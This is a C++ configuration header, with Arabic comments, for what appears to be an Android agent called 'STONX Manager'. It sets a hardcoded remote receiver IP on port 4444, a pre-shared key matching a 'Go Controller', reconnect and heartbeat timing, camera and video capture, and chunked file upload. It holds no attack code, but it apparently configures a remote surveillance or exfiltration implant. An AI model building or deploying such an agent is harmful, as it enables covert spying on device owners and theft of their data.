#pragma once
#include <cstdint>

// ════════════════════════════════════════════════════════════════════════════
// STONX Manager — إعدادات ثابتة في وقت التحويل
// غيّر PSK قبل البناء — يجب أن تطابق القيمة في Go Controller
// ════════════════════════════════════════════════════════════════════════════

namespace Config {

    // ── الاتصال ────────────────────────────────────────────────────────────
    constexpr const char*  RECEIVER_HOST           = "89.147.157.190";
    constexpr uint16_t     RECEIVER_PORT           = 4444;
    constexpr const char*  PSK                     = "STONX_SECRET_2026";

    // ── إعادة الاتصال (exponential backoff) ──────────────────────────────
    constexpr int RECONNECT_MIN_DELAY_SEC  = 2;
    constexpr int RECONNECT_MAX_DELAY_SEC  = 300;
    constexpr int HEARTBEAT_INTERVAL_SEC   = 30;
    constexpr int CONNECTION_TIMEOUT_SEC   = 15;
    constexpr int AUTH_TIMEOUT_SEC         = 30;

    // ── محرك النقل (مطابق للسيرفر Go) ────────────────────────────────────
    constexpr int CHUNK_SIZE_DEF   = 1 * 1024 * 1024;   // 1 MB (نفس Server ChunkSize)
    constexpr int WINDOW_SIZE_DEF  = 8;                 // عدد chunks طائرة
    constexpr int ZLIB_LEVEL       = 6;                 // zlib compression level
    constexpr int COMPRESS_MIN_PCT = 95;                // الضغط فقط لو وفّر 5%+
    constexpr int CHUNK_MAX_RETRIES = 3;                // محاولات chunk فاشل
    constexpr int SPEED_MEASURE_EVERY = 5;              // قياس السرعة كل X chunk
    constexpr int TRANSFER_READ_TIMEOUT_SEC = 60;       // مهلة قراءة ACK/NACK

    // ── Camera2 NDK ───────────────────────────────────────────────────────
    constexpr int CAMERA_WARMUP_FRAMES  = 15;
    constexpr int JPEG_WIDTH  = 1920;
    constexpr int JPEG_HEIGHT = 1080;

    // ── الفيديو ───────────────────────────────────────────────────────────
    constexpr int VIDEO_BITRATE_DEFAULT     = 4'000'000;  // 4 Mbps
    constexpr int VIDEO_FRAME_RATE_DEFAULT  = 30;

    // ── بروتوكول STONX ────────────────────────────────────────────────────
    constexpr const char* PROTO_VERSION     = "2.0";
    constexpr const char* AGENT_VERSION     = "1.0.0";
    constexpr int MAX_FRAME_SIZE            = 16 * 1024 * 1024; // 16 MB
    constexpr int REPLAY_WINDOW_SEC         = 300; // ±5 دقائق

    // ── مسارات التخزين الداخلي ───────────────────────────────────────────
    constexpr const char* PENDING_SUBDIR   = "pending";
    constexpr const char* MANIFESTS_SUBDIR = "manifests";
    constexpr const char* PROGRESS_SUBDIR  = "progress";
    constexpr const char* TEMP_SUBDIR      = "tmp";

} // namespace Config
